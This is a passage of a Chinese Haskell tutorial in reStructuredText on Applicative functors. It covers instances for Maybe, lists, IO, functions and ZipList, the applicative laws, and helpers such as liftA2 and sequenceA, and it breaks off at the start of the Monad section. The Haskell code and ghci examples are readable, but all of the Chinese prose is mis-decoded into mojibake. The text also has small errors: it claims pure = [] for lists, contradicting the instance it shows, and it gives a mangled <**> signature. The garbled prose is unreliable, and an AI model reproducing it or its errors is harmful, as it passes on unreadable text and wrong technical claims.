      fmapËøõË°åÁöÑÊìç‰ΩúÊòØÂ∞Ü‰∏Ä‰∏™ÊôÆÈÄö‰∏ÄÂÖÉÂáΩÊï∞Â∫îÁî®Âú®‰∏Ä‰∏™ÂáΩÂ≠êÂÜÖÈÉ®„ÄÇËÄåÂ¶ÇÊûúË¶ÅÂ∞Ü‰∏Ä‰∏™ÂåÖÂê´ÂáΩÊï∞ÁöÑÂáΩÂ≠êÂ∫îÁî®Âú®Âè¶‰∏Ä‰∏™ÂáΩÂ≠ê‰∏äÔºåfmapÂ∞±Â§ÑÁêÜ‰∏ç‰∫Ü‰∫ÜÔºå‰ΩÜÊòØÂ∫îÁî®ÂáΩÂ≠êÁöÑÊñπÊ≥ïÂèØ‰ª•Â§ÑÁêÜ„ÄÇÂ∫îÁî®ÂáΩÂ≠êÁöÑÂÆö‰πâÔºö

      .. container:: float highlight haskell
      ::

         class Functor f => Applicative f where
             pure :: a -> f a
             (<*>) :: f (a -> b) -> f a -> f b

      Â∫îÁî®ÂáΩÂ≠êË¶ÅÊ±ÇÂÆûÁé∞‰∏§‰∏™ÂáΩÊï∞Ôºö

      -  ``pure`` :: a -> f
         aÔºå‰∏çÈöæÁêÜËß£ÔºåpureÊé•Êî∂‰∏Ä‰∏™ÂÄºÔºåÂπ∂Â∞ÜÂÖ∂ÊîæÂú®ÈªòËÆ§ÁöÑ‰∏ä‰∏ãÊñá/ÂÆπÂô®‰∏≠„ÄÇÂØπ‰∫éÂàóË°®Ôºåpure
         = []ÔºõÂØπ‰∫éMaybeÔºåpure = Just
      -  ``<*>`` :: f (a -> b) -> f a -> f bÔºåÁ±ª‰ºº‰∫éfmap ::
         (a -> b) -> f a -> f
         bÔºå‰ΩÜ‰∏çÂêåÁöÑÊòØ<\*>ÁöÑÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞ÁöÑÁ±ªÂûãÊòØf (a ->
         b)‰∏çÊòØa ->
         b„ÄÇÊâÄ‰ª•<\*>ÁöÑÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞ÊòØÂú®‰∏ä‰∏ãÊñá‰∏≠ÁöÑÂáΩÊï∞ÔºåËÄå‰∏çÊòØ‰∏Ä‰∏™ÊôÆÈÄöÂáΩÊï∞„ÄÇÊç¢Âè•ËØùËØ¥Ôºå<\*>Êé•Êî∂‰∏Ä‰∏™Ë£ÖÊúâÂáΩÊï∞ÁöÑÂáΩÂ≠êÂíåÂè¶‰∏Ä‰∏™ÂáΩÂ≠êÔºåÂ∫îÁî®ÂáΩÊï∞ÂêéËøîÂõûÊñ∞ÁöÑÂáΩÂ≠ê„ÄÇ

      .. rubric:: ` <#Applicative-FunctorÂÆû‰æã>`__ Applicative
         FunctorÂÆû‰æã
         :name: Applicative-FunctorÂÆû‰æã

      .. rubric:: ` <#Maybe-1>`__ Maybe
         :name: Maybe-1

      MaybeÊòØ‰∏Ä‰∏™Â∫îÁî®ÂáΩÂ≠êÔºö

      .. container:: float highlight haskell
      ::

         instance Applicative Maybe where
             pure = Just
             Nothing <*> _ = Nothing
             (Just f) <*> something = fmap f something

      -  ``pure`` ÂáΩÊï∞ÔºöÂ∞Ü‰∏Ä‰∏™ÂÄºÊîæÂú®ÈªòËÆ§ÁöÑ‰∏ä‰∏ãÊñá‰∏≠ÔºåËÄåÂØπ‰∫éMaybeÔºåÈªòËÆ§ÁöÑ‰∏ä‰∏ãÊñáÂ∞±ÊòØJustÔºåÊâÄ‰ª•pure
         x = Just x
      -  ``<*>`` ÂáΩÊï∞ÔºöÂ∞ÜË£ÖÊúâÂáΩÊï∞ÁöÑÂáΩÂ≠ê‰∏≠ÁöÑÂáΩÊï∞Â∫îÁî®Âè¶‰∏Ä‰∏™ÂáΩÂ≠ê‰∏≠

         -  Á¨¨‰∏Ä‰∏™ÂèÇÊï∞ÊòØNothingÔºåÂç≥Á¨¨‰∏Ä‰∏™ÂáΩÂ≠ê‰∏çÂåÖÂê´ÂáΩÊï∞ÔºåÈÇ£ËøîÂõûÁöÑÁªìÊûúÂ∞±‰πü‰ºöÊòØNothing
         -  Á¨¨‰∏Ä‰∏™ÂèÇÊï∞ÊòØË£ÖÊúâÂáΩÊï∞fÁöÑÂáΩÂ≠êJust
            fÔºåÂ∞ÜÂÖ∂‰∏≠ÁöÑÂáΩÊï∞fÂ∫îÁî®Âú®ÂáΩÂ≠êsomething‰∏≠ÔºåÂè™ÈúÄË¶ÅÂ∞ÜfÊèêÂèñÂá∫Êù•‰ΩøÁî®fmapÂ∫îÁî®Âú®ÂáΩÂ≠êsomething‰∏≠Âç≥ÂèØ

      ÂÆûÈôÖÂ∫îÁî®ÁöÑ‰æãÂ≠êÔºö

      .. container:: float highlight haskell
      ::

         ghci> Just (+3) <*> Just 9
         Just 12
         ghci> pure (+3) <*> Just 9
         Just 12
         ghci> (+3) <$> Just 9
         Just 12
         ghci> Nothing <*> Just 9
         Nothing

      Á¨¨‰∏Ä‰∏™‰æãÂ≠êÔºåJust
      (+3)ÊòØ‰∏Ä‰∏™ÂåÖÂê´ÂáΩÊï∞(+3)ÁöÑÂáΩÂ≠êÔºåÂ∞ÜÂÖ∂Â∫îÁî®Âú®ÂáΩÂ≠êJust
      9‰∏≠ÔºåÂ∞ÜJust (+3)‰∏≠ÁöÑÂáΩÊï∞(+3)ÊèêÂèñÂá∫Êù•ÔºåÂ∫îÁî®Âú®Just
      9‰∏≠ÔºåÂæóÂà∞‰∫ÜJust 12

      Á¨¨‰∫å‰∏™‰æãÂ≠êÔºåÂèØ‰ª•ÂèëÁé∞ÔºåÂú®ËøôÈáåpure (+3)ÂíåJust
      (+3)Á≠âÊïàÔºåÂõ†‰∏∫pureÂ∞ÜÂáΩÊï∞(+3)ÊîæÂú®ÈªòËÆ§‰∏ä‰∏ãÊñá‰∏≠Ôºå‰πüÂ∞±ÊòØJust‰∏≠‰∫Ü

      ËÄå<\*>ËÉΩÂÅöÁöÑ‰∏çÊ≠¢Ëøô‰∫õÔºå‰ªñÂèØ‰ª•ËøûÁª≠‰º†ÂÖ•Êõ¥Â§öÂáΩÂ≠ê‰Ωú‰∏∫ÂèÇÊï∞ÔºåÊØîÂ¶ÇÔºö

      .. container:: float highlight haskell
      ::

         ghci> pure (+) <*> Just 3 <*> Just 9
         Just 12
         ghci> pure (\x y z -> x + y + z) <*> Just 3 <*> Just 4 <*> Just 5
         Just 12

      <\*>ÂáΩÊï∞‰∏ÄÊ†∑ÊòØÈªòËÆ§Â∑¶ÁªìÂêàÁöÑÔºåpure (+) <\*> Just 3 <\*>
      Just 9Áõ∏ÂΩì‰∫é(pure (+) <\*> Just 3) <\*> Just 9ÔºåËÄåpure
      (+) <\*> Just 3Â∞Ü(+)Â∫îÁî®Âú®Just 3‰∏äÔºåÂæóÂà∞ÁöÑÂ∞±ÊòØJust
      (+3)‰∏Ä‰∏™ÂåÖÂê´ÂáΩÊï∞ÁöÑÂáΩÂ≠êÔºåÂèàÂ∞ÜÂÖ∂ÈÄöËøá<\*>Â∫îÁî®Âú®‰∫ÜJust
      9‰∏äÔºåÂæóÂà∞‰∫ÜJust 12:

      .. container:: float highlight haskell
      ::

           pure (\x y z -> x + y + z) <*> Just 3 <*> Just 4 <*> Just 5
         = (pure (\x y z -> x + y + z) <*> Just 3) <*> Just 4 <*> Just 5
         = (Just (\y z -> 3 + y + z) <*> Just 4) <*> Just 5
         = Just (\z -> 3 + 4 + z) <*> Just 5 = Just (+7) <*> Just 5
         = Just 12

      ÊâÄ‰ª•ÂèØ‰ª•‰ΩøÁî®Á±ª‰ºº pure f <\*> x <\*> y <\*>
      ‚Ä¶Êù•Â∞Ü‰∏Ä‰∏™ÊôÆÈÄöÂ§öÂÖÉÂáΩÊï∞fÂ∫îÁî®Âú®Â§ö‰∏™ÂáΩÂ≠ê‰∏ä„ÄÇ

      ËÄå‰∏îpure f <\*>
      xÂÆûÈôÖ‰∏äÂÖàÂ∞ÜÊôÆÈÄöÂáΩÊï∞fÊîæÂú®‰∏ä‰∏ãÊñá‰∏≠ÔºåÁÑ∂ÂêéÊâßË°å<\*>Êó∂ÂÜçÂ∞ÜÂÖ∂ÊèêÂèñÂá∫Êù•ÊâßË°åfmapÔºåÊâÄ‰ª•ÂÆÉÂ∞±Áõ∏ÂΩì‰∫éÂ∞ÜÊôÆÈÄöÂáΩÊï∞Â∫îÁî®Âú®ÂáΩÂ≠êx‰∏äÔºåÂç≥fmap
      f xÔºå‰πüÂèØ‰ª•ÂÜôÊàêf <$> x„ÄÇÊâÄ‰ª•Â∏∏Áî®ÁöÑÂÜôÊ≥ïÂ∞±ÊòØÔºö

      f <$> x <\*> y <\*> ...

      .. rubric:: ` <#-1>`__ []
         :name: -1

      ÂàóË°®‰πüÊòØ‰∏Ä‰∏™Â∫îÁî®ÂáΩÂ≠êÔºö

      .. container:: float highlight haskell
      ::

         instance Applicative [] where
             pure x = [x]
             fs <*> xs = [f x | f <- fs, x <- xs]

      -  ``pure`` ÂáΩÊï∞ÔºöÂØπ‰∫éÂàóË°®ËÄåË®ÄÔºå‰∏Ä‰∏™ÂÄºÁöÑÊúÄÂ∞è‰∏ä‰∏ãÊñáÂ∞±ÊòØÂè™ÂåÖÂê´Ëøô‰∏™ÂÄºÁöÑÂàóË°®[x]
      -  ``<*>`` ÂáΩÊï∞ÔºöÂàóË°®ÁöÑ<\*>ÂáΩÊï∞ÊòØÈÄöËøáÂàóË°®Êé®ÂØºÊù•ÂÆûÁé∞ÁöÑ„ÄÇÂõ†‰∏∫‰∏çÂêå‰∫éMaybeÁöÑJustÂè™ÂåÖÂê´‰∏Ä‰∏™ÂÄºÔºåÂàóË°®ÂèØ‰ª•ÂåÖÂê´ÂæàÂ§öÂÄºÔºåÁ¨¨‰∏Ä‰∏™‰º†ÂÖ•ÁöÑÂàóË°®‰∏≠ÂèØËÉΩ‰ºöÂåÖÂê´ÂæàÂ§öÂáΩÊï∞ÔºåÁ¨¨‰∫å‰∏™‰º†ÂÖ•ÁöÑÂàóË°®‰πü‰ºöÂåÖÂê´ÂæàÂ§öÂÄºÔºåÊâÄ‰ª•Â∞±ÈúÄË¶ÅÂÖà‰ªéÁ¨¨‰∏Ä‰∏™ÂàóË°®‰∏≠ÂèñÂá∫‰∏Ä‰∏™ÂáΩÊï∞ÁÑ∂Âêé‰æùÊ¨°Â∫îÁî®Âú®Á¨¨‰∫å‰∏™ÂàóË°®ÁöÑÊØè‰∏™ÂÄº‰∏≠ÔºåÂÜçÂèñÂá∫Á¨¨‰∏Ä‰∏™ÂàóË°®‰∏≠ÁöÑÁ¨¨‰∫å‰∏™ÂáΩÊï∞Â∫îÁî®Âú®Á¨¨‰∫å‰∏™ÂàóË°®ÁöÑÊØè‰∏™ÂÄº‰∏≠‚Ä¶‚Ä¶ÊúÄÁªàËøîÂõûÂæóÂà∞ÁöÑÊâÄÊúâÁªìÊûúÁöÑÂàóË°®

      ‰ΩøÁî®‰æãÂ≠êÔºö

      .. container:: float highlight haskell
      ::

         ghci> [(+3), (*2)] <*> [1, 2]
         [4,5,2,4]
         ghci> [(+), (*)]  <*>  [1, 2]  <*>  [3, 4]  
         [4, 5, 5, 6, 3, 4, 6, 8]

      .. rubric:: ` <#IO-1>`__ IO
         :name: IO-1

      .. container:: float highlight haskell
      ::

         instance Applicative IO where
             pure = return
             a <*> b = do
                 f <- a
                 x <- b
                 return (f x)

      ‰πü‰∏çÈöæÁêÜËß£ÔºåpureÂáΩÊï∞Áõ¥Êé•Â∞Ü‰º†ÂÖ•ÁöÑÂÄºreturnÔºåÁõ∏ÂΩì‰∫éÊîæÂú®‰∫ÜIOÁöÑ‰∏ä‰∏ãÊñá‰∏≠„ÄÇËÄå<\*>ÂáΩÊï∞ÂÖàÂ∞Ü‰∏§‰∏™IO‰∏≠ÂÜÖÂÆπÊèêÂèñÂá∫Êù•ÔºåÁÑ∂ÂêéÂ∫îÁî®ÂáΩÊï∞ÂêéreturnÔºåÂΩ¢ÊàêÊñ∞ÁöÑIOÂáΩÂ≠ê

      .. container:: float highlight haskell
      ::

         ghci> (++) <$> getLine <*> getLine
         Line1
         Line2
         "Line1Line2"

      .. rubric:: ` <#gt-r-1>`__ (->) r
         :name: gt-r-1

      (->)
      rÂêåÊ†∑‰πüÊòØ‰∏Ä‰∏™Â∫îÁî®ÂáΩÂ≠êÔºåÂíåÂáΩÂ≠êÁöÑÂàÜÊûê‰∏ÄÊ†∑ÔºåÂÖàÊù•ÂàÜÊûêÂÆÉÁöÑ<\*>ÂáΩÊï∞ÁöÑÁ±ªÂûãÁ≠æÂêçÔºö

      <\*> :: f (a -> b) -> f a -> f b

      ÂÖ∂‰∏≠f‰∏∫(->) rÔºåÂ∞ÜÂÖ∂‰ª£ÂÖ•Âπ∂ÊõøÊç¢‰∏∫‰∏≠ÁºÄÔºö

      <\*> :: (r -> a -> b) -> (r -> a) -> (r -> b)

      ÂèØ‰ª•ÁúãÂá∫ÂÆÉÊé•Êî∂‰∏§‰∏™ÂáΩÊï∞f :: r -> a -> b„ÄÅg :: r ->
      aÔºåËøîÂõûÂè¶‰∏Ä‰∏™ÂáΩÊï∞h :: (r -> b)

      ÈÇ£‰πàËøîÂõûÁöÑÂáΩÊï∞ÁöÑËæìÂÖ•‰∏∫rÔºåËæìÂá∫‰∏∫bÔºåÊâÄ‰ª•ÂÖàÂØπËæìÂÖ•Â∫îÁî®ÂáΩÊï∞gÂæóÂà∞aÔºåÁÑ∂ÂêéÂú®ÂØπrÂíåaÂ∫îÁî®fÂæóÂà∞bÔºåÊâÄ‰ª•Êé®Êµã<\*>ÂáΩÊï∞ÁöÑÊìç‰ΩúÂ∞±ÊòØÔºö

      \\x -> f x (g x)

      ‰∫éÊòØÔºö

      .. container:: float highlight haskell
      ::

         instance Applicative ((->) r) where
             pure x = (\_ -> x)
             f <*> g = \x -> f x (g x)

      Â∞Ü‰∏Ä‰∏™ÂÄºÊîæÂú®ÂáΩÊï∞ÁöÑ‰∏ä‰∏ãÊñá‰∏≠ÔºåÊúÄÂ∞è‰∏ä‰∏ãÊñáÂ∞±Â∫îËØ•ËøîÂõûËøô‰∏™ÂÄºÊú¨Ë∫´ÔºåÊâÄ‰ª•pureÂáΩÊï∞ÂÆö‰πâ‰∏∫(\_
      -> x)ÔºåÂç≥Êó†ËÆ∫ËæìÂÖ•‰ªÄ‰πàÔºåÈÉΩËøîÂõûx

      Â∫îÁî®ÂáΩÂ≠êÁöÑ<\*>ÂáΩÊï∞Êé•Êî∂‰∏§‰∏™ÂáΩÂ≠êÔºåËøîÂõû‰∏Ä‰∏™Êñ∞ÁöÑÂáΩÂ≠ê„ÄÇÂØπ‰∫é(->)
      rÔºåÂÆÉÊé•Êî∂‰∏§‰∏™ÂáΩÊï∞ÔºåËøîÂõû‰∏Ä‰∏™Êñ∞ÁöÑÂáΩÊï∞„ÄÇÂÖ∑‰Ωì‰æãÂ≠êÔºö

      .. container:: float highlight haskell
      ::

         ghci> (+) <$> (+3) <*> (*100) $ 5
         508

      ÊâßË°åËøôÂè•Êó∂ÂèëÁîü‰∫Ü‰ªÄ‰πàÔºüÔºö

      .. container:: float highlight haskell
      ::

           (+) <$> (+3) <*> (*100) $ 5
         = ((+) <$> (+3)) <*> (*100) $ 5
         = ((+) . (+3)) <*> (*100) $ 5 = (\a -> (+) ((+3) a)) <*> (*100) $ 5
         = (\a b -> (a + 3 + b)) <*> (*100) $ 5
         = (\x -> x + 3 + ((*100) x)) $ 5
         = (\x -> x + 3 + x * 100) $ 5
         = 5 + 3 + 5 * 100 = 508
         = (5 + 3) + (5 * 100)

      ÊâÄ‰ª•Â∞±Áõ∏ÂΩì‰∫éÂÖàÂØπËæìÂÖ•ÂàÜÂà´ÊâßË°å(+3)Âíå(\*100)ÔºåÁÑ∂ÂêéÂ∞Ü‰∏§‰∏™ÁªìÊûúÊâßË°å‰∫Ü(+)

      ÂêåÊ†∑Ôºö

      .. container:: float highlight haskell
      ::

         ghci> (\x y z -> [x,y,z]) <$> (+3) <*> (*2) <*> (/2) $ 5  
         [8.0,10.0,2.5]  

      ÂÖàÂØπ5ÂàÜÂà´ÊâßË°å(+3)„ÄÅ(\*2)„ÄÅ(/2)ÔºåÁÑ∂ÂêéÂ∞ÜÂæóÂà∞ÁöÑ‰∏â‰∏™ÁªìÊûú‰º†ÂÖ•(\\x
      y z -> [x,y,z])ÂæóÂà∞‰∫ÜÊúÄÁªàÁöÑÁªìÊûú

      .. container:: float highlight haskell
      ::

           f <$> g <*> h <*> i
         = (\x -> f (g x) (h x) (i x))

      .. rubric:: ` <#ZipList>`__ ZipList
         :name: ZipList

      ÊôÆÈÄöÂàóË°®ÂÆûÁé∞ÁöÑ<\*>ÂáΩÊï∞ÊòØÂ∞ÜÊØè‰∏™ÂáΩÊï∞Â∫îÁî®Âú®ÊâÄÊúâÂÄº‰∏äÔºå‰ΩÜËøòÊúâ‰∏ÄÁßçÂÆûÁé∞ÊñπÊ≥ïÊòØÂ∞ÜÊØè‰∏™ÂáΩÊï∞Â∫îÁî®Âú®ÂØπÂ∫îÂÄº‰∏äÔºåÂõ†‰∏∫Âêå‰∏Ä‰∏™Á±ªÂûã‰∏çËÉΩÂ≠òÂú®Âêå‰∏ÄÂáΩÊï∞ÁöÑ‰∏§ÁßçÂÆûÁé∞ÂΩ¢ÂºèÔºåÊâÄ‰ª•ÂºïÂÖ•‰∫Ü‰∏Ä‰∏™Êñ∞ÁöÑÂàóË°®ZipListÔºåÂåÖÂê´Âú® ``Control.Applicative`` Ê®°Âùó‰∏≠

      .. container:: float highlight haskell
      ::

         instance Applicative ZipList where
             pure x = ZipList (repeat x)
             ZipList fs <*> ZipList xs = ZipList (zipWith ($) fs xs)

      ‰ΩÜÊòØZipListÂπ∂‰∏çÊòØShowÁöÑÂÆû‰æãÔºåÊâÄ‰ª•‰∏çËÉΩÁõ¥Êé•ÊòæÁ§∫Âá∫Êù•ÔºåË¶Å‰ΩøÁî® ``getZipList`` Êù•Ëé∑ÂèñÂÆÉÂÜÖÈÉ®ÁöÑÂàóË°®Ôºö

      .. container:: float highlight haskell
      ::

         ghci> getZipList $ (+) <$> ZipList [1,2,3] <*> ZipList [100,100..]  
         [101,102,103]
         ghci> getZipList $ (,,) <$> ZipList "dog" <*> ZipList "cat" <*> ZipList "rat"  
         [('d','c','r'),('o','a','a'),('g','t','t')]  

      .. rubric:: ` <#Applicative-Functor-Laws>`__ Applicative
         Functor Laws
         :name: Applicative-Functor-Laws

      Â∫îÁî®ÂáΩÂ≠ê‰∏ÄËà¨ÊúâÂõõ‰∏™ÂÆöÂæãÔºåÈÉΩÊòØ‰øùËØÅpureÁöÑÊ≠£Á°ÆÊÄßÁöÑÔºö

      #. ``Identity law`` Ôºöpure id <\*> v = v
      #. ``Homomorphism`` Ôºöpure f <\*> pure x = pure (f x)
      #. ``Interchange`` Ôºöu <\*> pure v = pure ($ v) <\*>
         u
      #. ``Composition`` Ôºöu <\*> (v <\*> w) = pure (.)
         <\*> u <\*> v <\*> w

      .. rubric:: ` <#Intuition-1>`__ Intuition
         :name: Intuition-1

      | ÁêÜËß£Â∫îÁî®ÂáΩÂ≠êÁöÑÊñπÂºè‰πüÊòØÂ∞ÜÂÖ∂Áúã‰ΩúÊòØËÆ°ÁÆó‰∏ä‰∏ãÊñáÔºàcontextÔºâÔºåÊØîÂ¶ÇË¶ÅËÆ°ÁÆóÔºö
      | $$
      | [[  g x_1 x_2 \\cdots x_n  ]]
      | $$

      ÂÖ∂‰∏≠$x_i$ÁöÑÁ±ªÂûãÊòØ$f\\
      t_i$Ôºåùëì ÊòØÂ∫îÁî®ÂáΩÂ≠êÔºàÁúã‰Ωú‰∏ä‰∏ãÊñáÔºâ„ÄÇËÄåÂáΩÊï∞$g$ÁöÑÁ±ªÂûãÊòØÔºö

      | $$
      | t_1\\to t_2\\to\\cdots\\to t_n\\to t
      | $$

      ÊâÄ‰ª•ÂèåÊã¨Âè∑Ôºàidiom
      bracketsÔºâÁöÑ‰ΩúÁî®ÊòØÂ∞Ü‰∏Ä‰∏™ÊôÆÈÄöÂáΩÊï∞Â∫îÁî®Âú®ÂåÖÂê´Âú®‰∏ä‰∏ãÊñá‰∏≠ÁöÑÂèÇÊï∞‰∏ä„ÄÇ$g\\
      x_1$ÂèØ‰ª•ÈÄöËøáfmapÊù•ÊâßË°åÔºåÂ∞Ü$g$ÊèêÂçáÔºàliftÔºâÂà∞$x_1$ÁöÑ‰∏ä‰∏ãÊñá‰∏≠ÔºåÁÑ∂ÂêéÂ∫îÁî®Âú®$x_1$‰∏ä„ÄÇ‰ΩÜÊòØfmapËøîÂõûÁöÑÁªìÊûúÊòØ‰∏Ä‰∏™ÂáΩÂ≠êÔºåÊç¢Âè•ËØùËØ¥Ôºå$g\\
      x_1$ÁªìÊûúÁöÑÁ±ªÂûãÊòØÔºö

      | $$
      | f  (t_2\\to t_3\\to\\cdots\\to t_n\\to t)
      | $$

      ‰ΩÜÊòØfmapÂπ∂‰∏çËÉΩÂ∞Ü‰∏ä‰∏ãÊñá‰∏≠ÁöÑÂáΩÊï∞Â∫îÁî®Âú®‰∏ä‰∏ãÊñá‰∏≠ÁöÑÂèÇÊï∞‰∏äÔºå‰∫éÊòØÂ∫îÁî®ÂáΩÂ≠êÁöÑ<\*>ÂáΩÊï∞Êèê‰æõ‰∫ÜËøô‰∏™ÊñπÊ≥ïÔºåÊâÄ‰ª•ËÆ°ÁÆó$[[\\
      g x_1 x_2 \\cdots x_n ]]$ÔºåÂè™ÈúÄË¶ÅÔºö

      g <$> x1 <\*> x2 <\*> ... <\*> xn

      ËÄåpureÂáΩÊï∞ÁöÑ‰ΩúÁî®Â∞±ÊòØÂ∞Ü‰∏Ä‰∏™‰∏çÂú®‰∏ä‰∏ãÊñá‰∏≠ÁöÑÂÄºÔºàÂáΩÊï∞ÊàñÂèÇÊï∞ÔºâÊèêÂçáÂà∞‰∏ä‰∏ãÊñá‰∏≠Ôºå‰ΩÜ‰∏çËøõË°åÂÖ∂‰ªñÊìç‰Ωú„ÄÇÊØîÂ¶ÇÂèÇÊï∞$x_2$Â¶ÇÊûú‰∏çÂú®‰∏ä‰∏ãÊñá‰∏≠ÔºåÈúÄË¶ÅÁî®pureÊèêÂçáÂà∞‰∏ä‰∏ãÊñá‰∏≠ÊâçËÉΩÊåâ‰∏äÈù¢ËÆ°ÁÆóÔºö

      g <$> x1 <\*> pure x2 <\*> ... <\*> xn

      .. rubric:: ` <#Â∏∏Áî®ÂáΩÊï∞-1>`__ Â∏∏Áî®ÂáΩÊï∞
         :name: Â∏∏Áî®ÂáΩÊï∞-1

      .. rubric:: ` <#liftA-amp-liftA2-amp-liftA3>`__ liftA
         & liftA2 & liftA3
         :name: liftA-amp-liftA2-amp-liftA3

      liftA :: Applicative f => (a -> b) -> f a -> f b

      liftA2 :: Applicative f => (a -> b -> c) -> f a -> f b
      -> f c

      liftA3 :: Applicative f => (a -> b -> c -> d) -> f a
      -> f b -> f c -> f d

      ‰∏çÈöæÊé®ÊµãliftAÂ∞±ÊòØfmapÔºå ``liftA2 f x1 x2`` Áõ∏ÂΩì‰∫é ``f <$> x1 <*> x2`` Ôºå ``liftA3 f x1 x2 x3`` Áõ∏ÂΩì‰∫é ``f <$> x1 <*> x2 <*> x3``

      .. rubric:: ` <#lt-amp-gt>`__ <\* & \*>
         :name: lt-amp-gt

      Á±ªÂûãÁ±ª‰ººÂáΩÂ≠êÁöÑ ``<$`` Âíå ``$>`` Ôºö

      (<\*) :: Applicative f => f a -> f b -> f a

      (\*>) :: Applicative f => f a -> f b -> f b

      <\*Êé•Êî∂‰∏§‰∏™ÂáΩÂ≠êÔºåÂ¶ÇÊûú‰∏§‰∏™ÂáΩÂ≠ê‰∏≠Âèà‰∏Ä‰∏™‰∏∫Á©∫ÔºåÂ∞±ËøîÂõûÁ©∫ÔºåÂê¶ÂàôËøîÂõûÁöÑÁ±ªÂûã‰∏éÁ¨¨‰∏Ä‰∏™ÂáΩÂ≠êÁõ∏Âêå„ÄÇ\*>ÂèçËøáÊù•

      .. container:: float highlight haskell
      ::

         ghci> Just 3 <* Just 4
         Just 3
         ghci> Just 3 *> Just 4
         Just 4
         ghci> Nothing <* Just 3
         Nothing
         ghci> Nothing *> Just 3
         Nothing
         ghci> [1, 2, 3] <* [3, 4]
         [1,1,2,2,3,3]
         ghci> [1, 2, 3] *> [3, 4]
         [3,4,3,4,3,4]
         ghci> [] <* [1, 2, 3]
         []
         ghci> [] *> [1, 2, 3]
         []

      .. rubric:: ` <#lt-gt-1>`__ <\*\*>
         :name: lt-gt-1

      (\*\*) :: Applicative f => f a -> f (a -> b) -> f b

      Êé•Êî∂ÁöÑÂèÇÊï∞ÊòØ<\*>ÂèçËΩ¨ËøáÊù•ÁöÑÔºåÂç≥ÂÖàÊé•Êî∂‰∏Ä‰∏™ÂèÇÊï∞ÂáΩÂ≠êÔºåÁÑ∂ÂêéÊé•Êî∂‰∏Ä‰∏™ÂáΩÊï∞ÂáΩÂ≠êÔºåÂú®Â∞ÜÂÖ∂Â∫îÁî®ËøîÂõû„ÄÇ‰ΩÜÊòØÂíåflip(<\*>)‰∏çÂêåÔºåÂÆÉÂÖàÂèñÂèÇÊï∞ÂáΩÂ≠êÁöÑÊØè‰∏™ÂèÇÊï∞ÔºåÁÑ∂ÂêéÂÜçÂèñÂáΩÊï∞ÂáΩÂ≠ê‰∏≠ÁöÑÂáΩÊï∞ÈÄê‰∏™Â∫îÁî®Ôºö

      .. container:: float highlight haskell
      ::

         ghci> [(+1), (+2), (+3)] <*> [1, 2]
         [2,3,3,4,4,5]
         ghci> [1, 2] <**> [(+1), (+2), (+3)]
         [2,3,4,3,4,5]
         ghci> flip(<*>) [1, 2] [(+1), (+2), (+3)]
         [2,3,3,4,4,5]

      .. rubric:: ` <#when-amp-unless>`__ when & unless
         :name: when-amp-unless

      when :: Applicative f => Bool -> f () -> f ()

      ‰º†ÂÖ•ÁöÑÁ¨¨‰∏Ä‰∏™ÊòØ‰∏Ä‰∏™ÁªìÊûú‰∏∫BoolÁ±ªÂûãÁöÑÊµãËØïÔºåÂ¶ÇÊûúÊµãËØï‰∏∫TrueÔºåÂàôË∞ÉÁî®Á¨¨‰∫å‰∏™ÂèÇÊï∞ÔºåÂê¶ÂàôËøîÂõûpure
      ()„ÄÇÔºàwhenÂáΩÊï∞Âú®‰∏äÊñáIOÊìç‰Ωú‰∏≠‰ΩøÁî®ËøáÔºâ

      unlessÂàô‰∏éwhenÁõ∏ÂèçÔºåÊµãËØï‰∏∫TrueËøîÂõûpure ()

      .. rubric:: ` <#sequenceA>`__ sequenceA
         :name: sequenceA

      sequenceA :: (Traversable t, Applicative f) => t (f a)
      -> f (t a)

      Â∫îÁî®Âú®ÂàóË°®‰∏äÊó∂ÔºåÂÆÉÁöÑÁ±ªÂûãÁõ∏ÂΩì‰∫éÔºö

      [f a] -> f [a]

      ÊâÄ‰ª•Âú®ÂàóË°®‰∏äÂÆÉÁöÑ‰ΩøÁî®ÊñπÊ≥ïÔºö

      .. container:: float highlight haskell
      ::

         ghci> sequenceA [Just 3, Just 2, Just 1]  
         Just [3,2,1]  
         ghci> sequenceA [Just 3, Nothing, Just 1]  
         Nothing  
         ghci> sequenceA [(+3),(+2),(+1)] 3  
         [6,5,4]  
         ghci> sequenceA [[1,2,3],[4,5,6]]  
         [[1,4],[1,5],[1,6],[2,4],[2,5],[2,6],[3,4],[3,5],[3,6]]  
         ghci> sequenceA [[1,2,3],[4,5,6],[3,4,4],[]]  
         []  

      ÂÆÉÂú®ÂØπÂêå‰∏Ä‰∏™ÂèÇÊï∞Â∫îÁî®‰∏çÂêåÂáΩÊï∞Êó∂ÂæàÊúâÁî®Ôºö

      .. container:: float highlight haskell
      ::

         ghci> map (\f -> f 7) [(>4), (<10), odd]  
         [True,True,True]  
         ghci> sequenceA [(>4), (<10), odd] 7  
         [True,True,True]  


   .. rubric:: ` <#Monad>`__ Monad
      :name: Monad

      ÂçïÂ≠êÔºàMonadÔºâÊòØÂØπ Applicative Functor ÁöÑÊâ©Â±ïÔºà‰ΩÜÊòØËØûÁîüÊØîApplicativeÊó©ÔºâÔºå
      Functor ÁöÑ ``<$>`` ÂáΩÊï∞ÂÆûÁé∞‰∫ÜÂ∞ÜÊôÆÈÄöÂáΩÊï∞Â∫îÁî®Âú®‰∏ä‰∏ãÊñáÂÄº‰∏äÔºåApplicative ÁöÑ ``<*>`` 
      ÂáΩÊï∞Â∞Ü‰∏ä‰∏ãÊñá‰∏≠ÂáΩÊï∞Â∫îÁî®Âú®‰∏ä‰∏ãÊñáÂÄº‰∏ä„ÄÇMonad Êèê‰æõ‰∫Ü‰∏Ä‰∏™ÂáΩÊï∞ ``>>=`` ÔºàbindÔºâÔºå
      Â∞Ü‰∏Ä‰∏™Êé•Êî∂ÊôÆÈÄöÂÄºËøîÂõû‰∏ä‰∏ãÊñáÂÄºÁöÑÂáΩÊï∞Â∫îÁî®Âú®‰∏ä‰∏ãÊñáÂÄº‰∏äÔºö

      .. container:: float highlight haskell
      ::

         class Applicative m => Monad m where
             (>>=) :: m a -> (a -> m b) -> m b
             (>>) :: m a -> m b -> m b
             return :: a -> m a
             m >> n = m >>= \_ -> n
             return = pure

      -  ``return`` ÂáΩÊï∞ÔºöÂíå ``pure`` ‰∏ÄÊ†∑ÔºåÂè™ÊòØÊúâÂè¶‰∏Ä‰∏™ÂêçÂ≠ó
